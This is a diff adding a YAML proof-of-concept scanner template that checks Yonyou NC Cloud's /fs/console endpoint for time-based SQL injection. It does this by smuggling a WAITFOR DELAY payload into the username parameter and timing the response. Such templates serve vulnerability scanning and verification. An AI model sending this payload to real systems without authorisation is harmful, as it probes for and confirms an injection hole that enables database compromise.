@@ -1,0 +1,29 @@
+name: poc-yaml-yongyou-nc-cloud-fs-sqli
+manual: true
+transport: http
+set:
+    sleepSecond: randomInt(4, 6)
+    rand: randomInt(1, 100)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /fs/console?username={{rand}}
+        expression: response.status == 500
+        output:
+            r0latency: response.latency
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /fs/console?username={{rand}}%27;WAITFOR%20DELAY%20%270:0:{{sleepSecond}}%27--&password=WiEZoxowjDhBk7bfE9nvzP3TjiK/RivMT1jKxrq42bI
+        expression: response.latency - r0latency >= sleepSecond * 1000 - 500
+expression: r0() && r1()
+detail:
+    author: z92g(https://github.com/z92g)
+    links:
+        - https://mp.weixin.qq.com/s/YfJSz53aXYB-YDSqcbtQFg
+    vulnerability:
+        id: CT-515819
+        level: high
